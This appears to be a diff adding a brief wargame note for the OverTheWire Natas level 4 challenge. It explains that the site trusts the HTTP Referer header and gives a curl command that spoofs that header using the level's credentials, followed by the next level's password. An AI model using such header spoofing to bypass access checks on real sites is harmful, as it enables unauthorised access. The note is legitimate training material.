@@ -1,0 +1,4 @@
+related to http referer header because the site verifies the previous page.
+
+curl --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ -e http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org
+=> iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
